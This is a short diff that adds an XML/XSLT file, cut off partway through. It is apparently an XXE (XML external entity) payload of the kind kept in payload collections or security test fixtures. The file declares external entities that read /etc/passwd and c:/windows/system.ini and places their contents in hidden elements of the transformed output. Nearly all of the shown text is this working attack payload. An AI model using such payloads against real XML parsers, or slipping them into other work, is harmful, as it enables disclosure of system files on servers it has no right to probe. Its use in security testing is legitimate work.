@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<?xml-stylesheet type="text/xsl" href="?#"?>
+<!DOCTYPE div [
+  <!ENTITY passwd_p        "file:///etc/passwd">
+  <!ENTITY passwd_c SYSTEM "file:///etc/passwd">
+  <!ENTITY sysini_p        "file:///c:/windows/system.ini">
+  <!ENTITY sysini_c SYSTEM "file:///c:/windows/system.ini">
+]>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+  <xsl:template match="/">
+    <xsl:copy-of select="document('')"/>
+    <body xmlns="http://www.w3.org/1999/xhtml">
+      <div style="display:none">
+        <p class="&passwd_p;">&passwd_c;</p>
+        <p class="&sysini_p;">&sysini_c;</p>
